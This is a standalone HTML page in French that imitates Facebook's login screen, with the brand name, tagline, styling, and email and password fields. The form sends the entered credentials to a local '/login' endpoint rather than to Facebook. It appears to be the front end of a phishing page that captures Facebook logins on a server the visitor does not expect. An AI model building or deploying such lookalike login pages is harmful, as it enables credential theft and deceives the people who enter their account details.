<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Facebook – Connexion ou inscription</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .left {
            margin-right: 50px;
        }
        .left h1 {
            color: #1877f2;
            font-size: 60px;
            margin: 0;
        }
        .left p {
            font-size: 28px;
            margin-top: -10px;
        }
        .login-box {
            background: white;
            padding: 20px;
            width: 350px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        input {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            cursor: pointer;
        }
        button:hover {
            background: #166fe5;
        }
        .forgot {
            text-align: center;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
        }
        .create {
            text-align: center;
            display: block;
            margin-top: 20px;
            padding: 12px;
            background: #42b72a;
            color: white;
            border-radius: 6px;
            text-decoration: none;
            font-size: 17px;
        }
    </style>
</head>
<body>

<div class="container">

    <div class="left">
        <h1>facebook</h1>
        <p>Avec Facebook, partagez et restez en contact<br>avec votre entourage.</p>
    </div>

    <form class="login-box" method="POST" action="/login">
        <input type="text" name="email" placeholder="Adresse email ou numéro" required>
        <input type="password" name="pass" placeholder="Mot de passe" required>
        <button type="submit">Connexion</button>

        <a href="#" class="forgot">Mot de passe oublié ?</a>
        <a href="#" class="create">Créer un compte</a>
    </form>

</div>

</body>
</html>
